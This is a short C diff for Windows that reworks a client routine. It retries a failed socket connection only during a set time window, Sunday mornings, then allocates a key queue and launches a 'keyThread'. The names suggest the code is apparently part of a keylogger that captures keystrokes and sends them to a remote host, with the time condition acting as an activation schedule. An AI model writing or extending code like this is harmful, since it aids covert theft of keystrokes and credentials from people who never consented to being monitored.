@@ -1,8 +1,21 @@
 #pragma once
 
+// Add argument to remove time condition
 int main_client() {
-	SOCKET MainSock = initSocket();
-	if (MainSock == INVALID_SOCKET) return 1;
+    SOCKET MainSock = INVALID_SOCKET;
+    while (1) {
+	    MainSock = initSocket();
+	    if (MainSock == INVALID_SOCKET) {
+            time_t nTime = time(NULL);
+            struct tm *aTime = localtime(&nTime);
+
+            if (aTime->tm_wday == 0 && aTime->tm_hour < 12) {
+                Sleep(2000);
+            }
+            else return 1;
+        }
+        else break;
+    }
 
 	queue *keyQueue = (queue *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(queue));
 	HANDLE keyhandle = CreateThread(NULL, 0, keyThread, (void*)keyQueue, 0, NULL);
